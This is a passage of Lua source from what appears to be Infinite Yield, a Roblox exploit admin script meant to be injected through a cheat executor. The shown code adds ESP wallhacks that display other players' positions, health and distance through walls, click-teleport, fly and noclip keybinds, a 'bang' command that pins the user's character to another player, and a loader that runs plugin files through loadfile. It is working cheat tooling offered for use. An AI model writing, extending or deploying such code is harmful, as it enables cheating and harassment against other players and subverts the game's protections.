	local foundList = {}
	
	for _,name in pairs(nameList) do
		if string.sub(name,1,1) ~= "+" and string.sub(name,1,1) ~= "-" then name = "+"..name end
		local tokens = toTokens(name)
		local initialPlayers = Players:GetPlayers()
		
		for i,v in pairs(tokens) do
			if v.Operator == "+" then
				local tokenContent = v.Name
				local foundCase = false
				for regex,case in pairs(SpecialPlayerCases) do
					local matches = {string.match(tokenContent,"^"..regex.."$")}
					if #matches > 0 then
						foundCase = true
						initialPlayers = onlyIncludeInTable(initialPlayers,case(speaker,matches,initialPlayers))
					end
				end
				if not foundCase then
					initialPlayers = onlyIncludeInTable(initialPlayers,getPlayersByName(tokenContent))
				end
			else
				local tokenContent = v.Name
				local foundCase = false
				for regex,case in pairs(SpecialPlayerCases) do
					local matches = {string.match(tokenContent,"^"..regex.."$")}
					if #matches > 0 then
						foundCase = true
						initialPlayers = removeTableMatches(initialPlayers,case(speaker,matches,initialPlayers))
					end
				end
				if not foundCase then
					initialPlayers = removeTableMatches(initialPlayers,getPlayersByName(tokenContent))
				end
			end
		end
		
		for i,v in pairs(initialPlayers) do table.insert(foundList,v) end
	end
	
	local foundNames = {}
	for i,v in pairs(foundList) do table.insert(foundNames,v.Name) end
	
	return foundNames
end

local getprfx=function(strn)
    if strn:sub(1,string.len(prefix))==prefix then return{'cmd',string.len(prefix)+1}
    end return
end

function do_exec(str, plr)
	str = str:gsub('/e ', '')
	local t = getprfx(str)
	if not t then return end
	str = str:sub(t[2])
	if t[1]=='cmd' then
		execCmd(str, plr)
		IndexContents('',true,false,true)
	end
end


Players.LocalPlayer.Chatted:connect(function(message)
	do_exec(message, Players.LocalPlayer)
end)

Holder.Cmdbar.Changed:connect(function(property)
	if property == "Text" and Holder.Cmdbar:IsFocused() then
		IndexContents(Holder.Cmdbar.Text,true,true)
	end
end)

Holder.Cmdbar.FocusLost:connect(function(enterpressed)
	if enterpressed then
		execCmd(Holder.Cmdbar.Text,Players.LocalPlayer)
	end
	Holder.Cmdbar.Text = "Command Bar"
	IndexContents('',true,false,true)
	if canvasPos ~= nil then
		CMDsF.CanvasPosition = Vector2.new(0, canvasPos)
		canvasTop = false
	end
	if SettingsOpen == true then
		Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
	end
end)

Holder.Cmdbar.Focused:Connect(function() historyCount = 0 end)
UserInputService.InputBegan:Connect(function(input)
    if not Holder.Cmdbar:IsFocused() then return end
    if input.KeyCode == Enum.KeyCode.Up then
        historyCount = historyCount + 1
        if historyCount > #cmdHistory then historyCount = #cmdHistory end
        Holder.Cmdbar.Text = cmdHistory[historyCount] or ""
    elseif input.KeyCode == Enum.KeyCode.Down then
        historyCount = historyCount - 1
        if historyCount < 1 then historyCount = 1 end
        Holder.Cmdbar.Text = cmdHistory[historyCount] or ""
    end
end)

ESPenabled = false
CHMSenabled = false

function round(num, numDecimalPlaces)
    local mult = 10^(numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
  end

function ESP(plr)
	spawn(function()
		local refreshing = true
		for i,v in pairs(PARENT:GetChildren()) do
			if v.Name == plr.Name..'_ESP' then
				v:Destroy()
			end
		end
		wait()
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not PARENT:FindFirstChild(plr.Name..'_ESP') then
			local ESPholder = Instance.new("Folder", PARENT)
			ESPholder.Name = plr.Name..'_ESP'
			for b,n in pairs (plr.Character:GetChildren()) do
				if (n:IsA("BasePart")) then
					local a = Instance.new("BoxHandleAdornment", ESPholder)
					a.Name = plr.Name
					a.Adornee = n
					a.AlwaysOnTop = true
					a.ZIndex = 0
					a.Size = n.Size
					a.Transparency = 0.7
					if plr.TeamColor == Players.LocalPlayer.TeamColor then
						a.Color = BrickColor.new("Lime green")
					else
						a.Color = BrickColor.new("Really red")
					end
				end
			end
            if plr.Character and plr.Character:FindFirstChild('Head') then
				local BillboardGui = Instance.new("BillboardGui", ESPholder)
				local TextLabel = Instance.new("TextLabel")
				BillboardGui.Adornee = plr.Character.Head
				BillboardGui.Name = plr.Name
				BillboardGui.Size = UDim2.new(0, 100, 0, 150)
				BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
				BillboardGui.AlwaysOnTop = true
				TextLabel.Parent = BillboardGui
				TextLabel.BackgroundTransparency = 1
				TextLabel.Position = UDim2.new(0, 0, 0, -50)
				TextLabel.Size = UDim2.new(0, 100, 0, 100)
				TextLabel.Font = Enum.Font.SourceSansSemibold
				TextLabel.TextSize = 20
				TextLabel.TextColor3 = Color3.new(1, 1, 1)
				TextLabel.TextStrokeTransparency = 0
				TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
				plr.CharacterAdded:Connect(function()
					if ESPenabled then
						refreshing = false
						ESPholder:Destroy()
						repeat wait(1) until plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid')
						ESP(plr)
					end
				end)
				game:GetService("RunService").RenderStepped:Connect(function()
					if refreshing and PARENT:FindFirstChild(plr.Name..'_ESP') and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid') then
						local pos = math.floor((Players.LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude)
						TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character.Humanoid.Health, 1)..' | Studs: '..pos
					end
				end)
			end
		end
	end)
end

function CHMS(plr)
	spawn(function()
		local refreshing = true
		for i,v in pairs(PARENT:GetChildren()) do
			if v.Name == plr.Name..'_CHMS' then
				v:Destroy()
			end
		end
		wait()
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not PARENT:FindFirstChild(plr.Name..'_CHMS') then
			local ESPholder = Instance.new("Folder", PARENT)
			ESPholder.Name = plr.Name..'_CHMS'
			for b,n in pairs (plr.Character:GetChildren()) do
				if (n:IsA("BasePart")) then
					local a = Instance.new("BoxHandleAdornment", ESPholder)
					a.Name = plr.Name
					a.Adornee = n
					a.AlwaysOnTop = true
					a.ZIndex = 0
					a.Size = n.Size
					a.Transparency = 0.7
					if plr.TeamColor == Players.LocalPlayer.TeamColor then
						a.Color = BrickColor.new("Lime green")
					else
						a.Color = BrickColor.new("Really red")
					end
				end
			end
			plr.CharacterAdded:Connect(function()
				if CHMSenabled then
					refreshing = false
					ESPholder:Destroy()
					repeat wait(1) until plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid')
					CHMS(plr)
				end
			end)
		end
	end)
end

function Locate(plr)
	spawn(function()
		local refreshing = true
		for i,v in pairs(PARENT:GetChildren()) do
			if v.Name == plr.Name..'_LC' then
				v:Destroy()
			end
		end
		wait()
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not PARENT:FindFirstChild(plr.Name..'_LC') then
			local ESPholder = Instance.new("Folder", PARENT)
			ESPholder.Name = plr.Name..'_LC'
			for b,n in pairs (plr.Character:GetChildren()) do
				if (n:IsA("BasePart")) then
					local a = Instance.new("BoxHandleAdornment", ESPholder)
					a.Name = plr.Name
					a.Adornee = n
					a.AlwaysOnTop = true
					a.ZIndex = 0
					a.Size = n.Size
					a.Transparency = 0.7
					if plr.TeamColor == Players.LocalPlayer.TeamColor then
						a.Color = BrickColor.new("Lime green")
					else
						a.Color = BrickColor.new("Really red")
					end
				end
			end
			if plr.Character and plr.Character:FindFirstChild('Head') then
				local BillboardGui = Instance.new("BillboardGui", ESPholder)
				local TextLabel = Instance.new("TextLabel")
				BillboardGui.Adornee = plr.Character.Head
				BillboardGui.Name = plr.Name
				BillboardGui.Size = UDim2.new(0, 100, 0, 150)
				BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
				BillboardGui.AlwaysOnTop = true
				TextLabel.Parent = BillboardGui
				TextLabel.BackgroundTransparency = 1
				TextLabel.Position = UDim2.new(0, 0, 0, -50)
				TextLabel.Size = UDim2.new(0, 100, 0, 100)
				TextLabel.Font = Enum.Font.SourceSansSemibold
				TextLabel.TextSize = 20
				TextLabel.TextColor3 = Color3.new(1, 1, 1)
				TextLabel.TextStrokeTransparency = 0
				TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
				plr.CharacterAdded:Connect(function()
					if ESPholder ~= nil and ESPholder.Parent ~= nil then
						refreshing = false
						ESPholder:Destroy()
						repeat wait(1) until plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid')
						Locate(plr)
					end
				end)
				game:GetService("RunService").RenderStepped:Connect(function()
					if refreshing and PARENT:FindFirstChild(plr.Name..'_LC') and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid') then
						local pos = math.floor((Players.LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude)
						TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character.Humanoid.Health, 1)..' | Studs: '..pos
					end
				end)
			end
		end
	end)
end

bindsGUI = KeybindEditor
awaitingInput = false
keySelected = false

function unkeybind(cmd,key)
	for i = #binds,1,-1 do
		if binds[i].COMMAND == cmd and binds[i].KEY == key then
			table.remove(binds, i)
		end
	end
	refreshbinds()
	updatesaves()
	if key == 'RightClick' or key == 'LeftClick' then
		notify('Keybinds Updated','Unbinded '..key..' from '..cmd)
	else
		notify('Keybinds Updated','Unbinded '..key:sub(14)..' from '..cmd)
	end
end

function refreshbinds()
	if Holder_2 then
		Holder_2:ClearAllChildren()
		Holder_2.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i = 1, #binds do
			local YSize = 25
			local Position = ((i * YSize) - YSize)
			local newbind = Example_2:Clone()
			newbind.Parent = Holder_2
			newbind.Visible = true
			newbind.Position = UDim2.new(0,0,0, Position + 5)
			local input = tostring(binds[i].KEY)
			local key
			if input == 'RightClick' or input == 'LeftClick' then
				key = input
			else
				key = input:sub(14)
			end
			newbind.Text.Text = key.." > "..binds[i].COMMAND
			Holder_2.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newbind.Text.Delete.MouseButton1Click:Connect(function()
				unkeybind(binds[i].COMMAND,binds[i].KEY)
			end)
		end
	end
end

refreshbinds()

PositionsFrame.Delete.MouseButton1Click:Connect(function()
	execCmd('cpos')
end)

function refreshwaypoints()
	if Holder_4 then
		Holder_4:ClearAllChildren()
		Holder_4.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i = 1, #WayPoints do
			local YSize = 25
			local Position = ((i * YSize) - YSize)
			local newpoint = Example_4:Clone()
			newpoint.Parent = Holder_4
			newpoint.Visible = true
			newpoint.Position = UDim2.new(0,0,0, Position + 5)
			newpoint.Text.Text = WayPoints[i].NAME
			Holder_4.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newpoint.Text.Delete.MouseButton1Click:Connect(function()
				execCmd('dpos '..WayPoints[i].NAME)
			end)
			newpoint.Text.TP.MouseButton1Click:Connect(function()
				execCmd("loadpos "..WayPoints[i].NAME)
			end)
		end
	end
end

refreshwaypoints()

function refreshaliases()
	if Holder_3 then
		Holder_3:ClearAllChildren()
		Holder_3.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i = 1, #aliases do
			local YSize = 25
			local Position = ((i * YSize) - YSize)
			local newalias = Example_3:Clone()
			newalias.Parent = Holder_3
			newalias.Visible = true
			newalias.Position = UDim2.new(0,0,0, Position + 5)
			newalias.Text.Text = aliases[i].CMD.." > "..aliases[i].ALIAS
			Holder_3.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newalias.Text.Delete.MouseButton1Click:Connect(function()
				execCmd('removealias '..aliases[i].ALIAS)
			end)
		end
	end
end

BindTo.MouseButton1Click:Connect(function()
	awaitingInput = true
	BindTo.Text = 'Press something'
end)

Add_2.MouseButton1Click:Connect(function()
	if keySelected then
		if string.find(Cmdbar_2.Text, "\\\\") then
			notify('Keybind Error','Only use one backslash to keybind multiple commands into one keybind or command')
		else
			addbind(Cmdbar_2.Text,keyPressed)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to '..Cmdbar_2.Text)
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to '..Cmdbar_2.Text)
			end
		end
	end
end)

Exit_2.MouseButton1Click:Connect(function()
	Cmdbar_2.Text = 'Command'
	BindTo.Text = 'Click to bind'
	keySelected = false
	KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, -400), "InOut", "Quart", 0.5, true, nil)
end)

local function onInputBegan(input,gameProcessed)
	if awaitingInput then
		if input.UserInputType == Enum.UserInputType.Keyboard then
			keyPressed = tostring(input.KeyCode)
			BindTo.Text = keyPressed:sub(14)
		elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
			keyPressed = 'LeftClick'
			BindTo.Text = 'LeftClick'
		elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
			keyPressed = 'RightClick'
			BindTo.Text = 'RightClick'
		end
		awaitingInput = false
		keySelected = true
	end
	if not gameProcessed and #binds > 0 then
		for i,v in pairs(binds)do
			if input.UserInputType == Enum.UserInputType.Keyboard and v.KEY:lower()==tostring(input.KeyCode):lower() then
				execCmd(v.COMMAND,Players.LocalPlayer)
			elseif input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEY:lower()=='leftclick' then
				execCmd(v.COMMAND,Players.LocalPlayer)
			elseif input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEY:lower()=='rightclick' then
				execCmd(v.COMMAND,Players.LocalPlayer)
			end
		end
	end
end
 
UserInputService.InputBegan:connect(onInputBegan)

game:GetService('RunService').Stepped:connect(function()
	if bangplr then
		Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Players[bangplr].Character.HumanoidRootPart.CFrame
	end
	if spinenabled then
		pcall(function()
			spinning.Position = Players.LocalPlayer.Character.Head.Position
		end)
	end
end)

Fly.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglefly',keyPressed)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle fly')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle fly')
		end
	end
end)

Noclip.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglenoclip',keyPressed)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle noclip')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle noclip')
		end
	end
end)

Float.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglefloat',keyPressed)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle float')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle float')
		end
	end
end)

IYMouse.Button1Down:connect(function()
	for i,v in pairs(binds) do
		if v.COMMAND == 'clicktp' then
			local input = v.KEY
			if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) and Players.LocalPlayer.Character then
				Players.LocalPlayer.Character.HumanoidRootPart.CFrame = IYMouse.Hit + Vector3.new(0,7,0)
			elseif input == 'LeftClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Players.LocalPlayer.Character then
				Players.LocalPlayer.Character.HumanoidRootPart.CFrame = IYMouse.Hit + Vector3.new(0,7,0)
			elseif UserInputService:IsKeyDown(Enum.KeyCode[input:sub(14)]) and Players.LocalPlayer.Character then
				Players.LocalPlayer.Character.HumanoidRootPart.CFrame = IYMouse.Hit + Vector3.new(0,7,0)
			end
		end
	end
end)

ClickTP.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('clicktp',keyPressed)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to click tp')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click tp')
		end
	end
end)

PluginsGUI = PluginEditor.background

function refreshplugins()
	if Holder_5 then
		Holder_5:ClearAllChildren()
		Holder_5.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i,v in pairs(PluginsTable) do
			local pName = v
			local YSize = 25
			local Position = ((i * YSize) - YSize)
			local newplugin = Example_5:Clone()
			newplugin.Parent = Holder_5
			newplugin.Visible = true
			newplugin.Position = UDim2.new(0,0,0, Position + 5)
			newplugin.Text.Text = pName
			Holder_5.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newplugin.Text.Delete.MouseButton1Click:Connect(function()
				for i = #cmds,1,-1 do
					if cmds[i].PLUGIN == pName then
						table.remove(cmds, i)
					end
				end
				for i,v in pairs(Holder.CMDs:GetChildren()) do
					if v.Name == 'PLUGIN_'..pName then
						v:Destroy()
					end
				end
				for i,v in pairs(PluginsTable) do
					if v == pName then
						table.remove(PluginsTable, i)
						notify('Removed Plugin',pName..' was removed')
					end
				end
				IndexContents('',true)
				refreshplugins()
			end)
		end
		updatesaves()
	end
end

local PluginCache
function LoadPlugin(val,startup)
	local plugin

	function CatchedPluginLoad()
		plugin = loadfile(val)()
	end

	function handlePluginError(plerror)
		notify('Plugin Error','An error occurred with the plugin, "'..val..'" and it could not be loaded')
		if FindInTable(PluginsTable,val) then
			for i,v in pairs(PluginsTable) do
				if v == val then
					table.remove(PluginsTable,i)
				end
			end
		end

		print("Original Error: "..tostring(plerror))
		print("Plugin Error, stack traceback: "..tostring(debug.traceback()))

		plugin = nil

		return false
	end

	xpcall(CatchedPluginLoad, handlePluginError)

	if plugin ~= nil then
		if not startup then
			notify('Loaded Plugin',"Name: "..plugin["PluginName"].."\n".."Description: "..plugin["PluginDescription"])
		end
		addcmdtext('',val)
		addcmdtext(string.upper('--'..plugin["PluginName"]),val,plugin["PluginDescription"])
		for i,v in pairs(plugin["Commands"]) do 
			local cmdExt = ''
			local cmdName = i
			local function handleNames()
				cmdName = i
				if findCmd(cmdName..cmdExt) then
					if isNumber(cmdExt) then
						cmdExt = cmdExt+1
					else
						cmdExt = 1
					end
					handleNames()
				else
					cmdName = cmdName..cmdExt
				end
			end
			handleNames()
			addcmd(cmdName, v["Aliases"], v["Function"], val)
			if v["ListName"] and cmdExt == '' then
				addcmdtext(v["ListName"],val,v["Description"])
			else
				addcmdtext(cmdName,val,v["Description"])
			end
		end
		IndexContents('',true)
	elseif plugin == nil then
		plugin = nil
	end
end

function FindPlugins()
	if PluginsTable ~= nil and type(PluginsTable) == "table" then
		for i,v in pairs(PluginsTable) do
			LoadPlugin(v,true)
		end
		refreshplugins()
	end
end

PluginsGUI.AddPlugin.MouseButton1Click:connect(function()
	if PluginsGUI.FileName.Text:lower() == 'plugin file name' or PluginsGUI.FileName.Text:lower() == 'iy_fe.iy' or PluginsGUI.FileName.Text == 'iy_fe' then
		notify('Plugin Error','Please enter a valid plugin')
	else
		local file
		local fileName
		if PluginsGUI.FileName.Text:sub(-3) == '.iy' then
			pcall(function() file = readfile(PluginsGUI.FileName.Text) end)
			fileName = PluginsGUI.FileName.Text
		else
			pcall(function() file = readfile(PluginsGUI.FileName.Text..'.iy') end)
			fileName = PluginsGUI.FileName.Text..'.iy'
		end
		if file then
			if not FindInTable(PluginsTable, fileName) then
				table.insert(PluginsTable, fileName)
				LoadPlugin(fileName)
				refreshplugins()
			else
				notify('Plugin Error','This plugin is already added')
			end
		else
			notify('Plugin Error','Cannot locate file "'..fileName..'". Is the file in the correct folder?')
		end
	end
end)

if PluginsTable ~= nil or PluginsTable ~= {} then
	FindPlugins(PluginsTable)
end

Exit_3.MouseButton1Click:connect(function()
	PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, -400), "InOut", "Quart", 0.5, true, nil)
	PluginsGUI.FileName.Text = 'Plugin File Name'
end)

PluginsFrame.Add.MouseButton1Click:Connect(function()
	PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, 250), "InOut", "Quart", 0.5, true, nil)
end)

Settings.Plugins.Select.MouseButton1Click:Connect(function()
	if writefileExploit() then
		PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		disablebuttons()
	else
		notify('Incompatible Exploit','Your exploit is unable to use plugins')
	end
end)

PluginsFrame.Close.MouseButton1Click:Connect(function()
	enablebuttons()
	PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
end)

addcmd('addalias',{},
function(args,speaker)
	if #args < 2 then return end
	local cmd = string.lower(args[1])
	local alias = string.lower(args[2])
	for i,v in pairs(cmds) do
		if v.NAME:lower()==cmd or std.inTable(v.ALIAS,cmd) then
			customAlias[alias] = v
			aliases[#aliases + 1] = {CMD = cmd, ALIAS = alias}
			notify('Aliases Modified',"Added "..alias.." as an alias to "..cmd)
			updatesaves()
			refreshaliases()
			break
		end
	end
end)

addcmd('loadsavedaliases',{},
function(args,speaker)
    if #args < 2 then return end
    local cmd = string.lower(args[1])
    local alias = string.lower(args[2])
    for i,v in pairs(cmds) do
        if v.NAME:lower()==cmd or std.inTable(v.ALIAS,cmd) then
            customAlias[alias] = v
			refreshaliases()
            break
        end
    end
end)

if aliases then
	for i = 1, #aliases do
		execCmd('loadsavedaliases '..aliases[i].CMD..' '..aliases[i].ALIAS)
	end
end

addcmd('removealias',{},
function(args,speaker)
	if #args < 1 then return end
	local alias = string.lower(args[1])
	if customAlias[alias] then
		local cmd = customAlias[alias].NAME
		customAlias[alias] = nil
		for i,v in pairs(aliases) do
			if v.ALIAS == tostring(alias) then
				table.remove(aliases, i)
			end
		end
		notify('Aliases Modified',"Removed the alias "..alias.." from "..cmd)
		updatesaves()
		refreshaliases()
	end
end)

addcmd('clraliases',{},
function(args,speaker)
	customAlias = {}
	aliases = {}
	notify('Aliases Modified','Removed all aliases')
	updatesaves()
	refreshaliases()
end)

addcmd('serverinfo',{'info','sinfo'},
function(args, speaker)
	local FRAME = Instance.new("Frame")
	local shadow = Instance.new("Frame")
	local PopupText = Instance.new("TextLabel")
	local Exit = Instance.new("ImageButton")
	local background = Instance.new("Frame")
	local Dark = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local TextLabel2 = Instance.new("TextLabel")
	local TextLabel3 = Instance.new("TextLabel")
	local Time = Instance.new("TextLabel")
	local appearance = Instance.new("TextLabel")
	local maxplayers = Instance.new("TextLabel")
	local name = Instance.new("TextLabel")
	local placeid = Instance.new("TextLabel")
	local playerid = Instance.new("TextLabel")
	local players = Instance.new("TextLabel")
	
	FRAME.Name = randomString()
	FRAME.Parent = PARENT
	FRAME.Active = true
	FRAME.BackgroundColor3 = Color3.new(1, 1, 1)
	FRAME.BackgroundTransparency = 1
	FRAME.Position = UDim2.new(0.5, -130, 0, -400)
	FRAME.Size = UDim2.new(0, 250, 0, 20)
	FRAME.ZIndex = 4
	dragGUI(FRAME)
	
	shadow.Name = "shadow"
	shadow.Parent = FRAME
	shadow.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
	shadow.BorderColor3 = Color3.new(0, 0, 0)
	shadow.BorderSizePixel = 0
	shadow.Size = UDim2.new(0, 250, 0, 20)
	shadow.ZIndex = 4
	
	PopupText.Name = "PopupText"
	PopupText.Parent = shadow
	PopupText.BackgroundTransparency = 1
	PopupText.Position = UDim2.new(0, 38, 0, 0)
	PopupText.Size = UDim2.new(0.760355055, -16, 0.949999988, 0)
	PopupText.ZIndex = 4
	PopupText.Font = Enum.Font.SourceSans
	PopupText.TextSize = 20
	PopupText.Text = "Server"
	PopupText.TextColor3 = Color3.new(1, 1, 1)
	PopupText.TextStrokeTransparency = 0
	PopupText.TextWrapped = true
	
	Exit.Name = "Exit"
	Exit.Parent = shadow
	Exit.BackgroundColor3 = Color3.new(1, 1, 1)
	Exit.BackgroundTransparency = 1
	Exit.Size = UDim2.new(0, 20, 0, 20)
	Exit.ZIndex = 4
	Exit.Image = "rbxassetid://2132544126"
	
	background.Name = "background"
	background.Parent = FRAME
	background.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
	background.BorderColor3 = Color3.new(0, 0, 0)
	background.BorderSizePixel = 0
	background.Position = UDim2.new(0, 0, 1, 0)
	background.Size = UDim2.new(0, 250, 0, 250)
	background.ZIndex = 4
	
	Dark.Name = "Dark"
	Dark.Parent = background
	Dark.Active = true
	Dark.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
	Dark.BackgroundTransparency = 0.5
	Dark.BorderSizePixel = 0
	Dark.Size = UDim2.new(0, 250, 0, 5)
	Dark.ZIndex = 4
	
	TextLabel.Name = "Text Label"
	TextLabel.Parent = background
	TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel.BackgroundTransparency = 1
	TextLabel.BorderColor3 = Color3.new(0, 0, 0)
	TextLabel.Position = UDim2.new(0, 5, 0, 80)
	TextLabel.Size = UDim2.new(0, 100, 0, 20)
	TextLabel.ZIndex = 10
	TextLabel.Font = Enum.Font.SourceSansLight
	TextLabel.FontSize = Enum.FontSize.Size24
	TextLabel.Text = "Run Time:"
	TextLabel.TextColor3 = Color3.new(1, 1, 1)
	TextLabel.TextStrokeTransparency = 0
	TextLabel.TextXAlignment = Enum.TextXAlignment.Left
	
	TextLabel2.Name = "Text Label2"
	TextLabel2.Parent = background
	TextLabel2.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel2.BackgroundTransparency = 1
	TextLabel2.BorderColor3 = Color3.new(0, 0, 0)
	TextLabel2.Position = UDim2.new(0, 5, 0, 130)
	TextLabel2.Size = UDim2.new(0, 100, 0, 20)
	TextLabel2.ZIndex = 10
	TextLabel2.Font = Enum.Font.SourceSansLight
	TextLabel2.FontSize = Enum.FontSize.Size24
	TextLabel2.Text = "Statistics:"
	TextLabel2.TextColor3 = Color3.new(1, 1, 1)
	TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
	
	TextLabel3.Name = "Text Label3"
	TextLabel3.Parent = background
	TextLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel3.BackgroundTransparency = 1
	TextLabel3.BorderColor3 = Color3.new(0, 0, 0)
	TextLabel3.BorderSizePixel = 0
	TextLabel3.Position = UDim2.new(0, 5, 0, 10)
	TextLabel3.Size = UDim2.new(0, 100, 0, 20)
	TextLabel3.ZIndex = 10
	TextLabel3.Font = Enum.Font.SourceSansLight
	TextLabel3.FontSize = Enum.FontSize.Size24
	TextLabel3.Text = "Local Player:"
	TextLabel3.TextColor3 = Color3.new(1, 1, 1)
	TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
	
	Time.Name = "Time"
	Time.Parent = background
	Time.BackgroundColor3 = Color3.new(0, 0.8, 1)
	Time.BackgroundTransparency = 1
	Time.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
	Time.Position = UDim2.new(0, 5, 0, 105)
	Time.Size = UDim2.new(0, 100, 0, 20)
	Time.ZIndex = 10
	Time.Font = Enum.Font.SourceSans
	Time.FontSize = Enum.FontSize.Size14
	Time.Text = "LOADING"
	Time.TextColor3 = Color3.new(1, 1, 1)
	Time.TextXAlignment = Enum.TextXAlignment.Left
	
	appearance.Name = "appearance"
	appearance.Parent = background
	appearance.BackgroundColor3 = Color3.new(0, 0.8, 1)
	appearance.BackgroundTransparency = 1
	appearance.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
	appearance.Position = UDim2.new(0, 5, 0, 55)
	appearance.Size = UDim2.new(0, 100, 0, 20)
	appearance.ZIndex = 10
	appearance.Font = Enum.Font.SourceSans
	appearance.FontSize = Enum.FontSize.Size14
	appearance.Text = "Appearance: LOADING"
	appearance.TextColor3 = Color3.new(1, 1, 1)
	appearance.TextXAlignment = Enum.TextXAlignment.Left
	
	maxplayers.Name = "maxplayers"
	maxplayers.Parent = background
	maxplayers.BackgroundColor3 = Color3.new(0, 0.8, 1)
	maxplayers.BackgroundTransparency = 1
	maxplayers.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
	maxplayers.Position = UDim2.new(0, 5, 0, 175)
	maxplayers.Size = UDim2.new(0, 100, 0, 20)
	maxplayers.ZIndex = 10
	maxplayers.Font = Enum.Font.SourceSans
	maxplayers.FontSize = Enum.FontSize.Size14
	maxplayers.Text = "LOADING"
	maxplayers.TextColor3 = Color3.new(1, 1, 1)
	maxplayers.TextXAlignment = Enum.TextXAlignment.Left
	
	name.Name = "name"
	name.Parent = background
	name.BackgroundColor3 = Color3.new(0, 0.8, 1)
	name.BackgroundTransparency = 1
	name.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
	name.Position = UDim2.new(0, 5, 0, 215)
	name.Size = UDim2.new(0, 240, 0, 30)
	name.ZIndex = 10
	name.Font = Enum.Font.SourceSans
	name.FontSize = Enum.FontSize.Size14
	name.Text = "Place Name: LOADING"
	name.TextColor3 = Color3.new(1, 1, 1)
	name.TextWrapped = true
	name.TextXAlignment = Enum.TextXAlignment.Left
	name.TextYAlignment = Enum.TextYAlignment.Top
	
	placeid.Name = "placeid"
	placeid.Parent = background
	placeid.BackgroundColor3 = Color3.new(0, 0.8, 1)
	placeid.BackgroundTransparency = 1
	placeid.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
	placeid.Position = UDim2.new(0, 5, 0, 195)
	placeid.Size = UDim2.new(0, 100, 0, 20)
	placeid.ZIndex = 10
	placeid.Font = Enum.Font.SourceSans
	placeid.FontSize = Enum.FontSize.Size14
	placeid.Text = "Place ID: LOADING"
	placeid.TextColor3 = Color3.new(1, 1, 1)
	placeid.TextXAlignment = Enum.TextXAlignment.Left
	
	playerid.Name = "playerid"
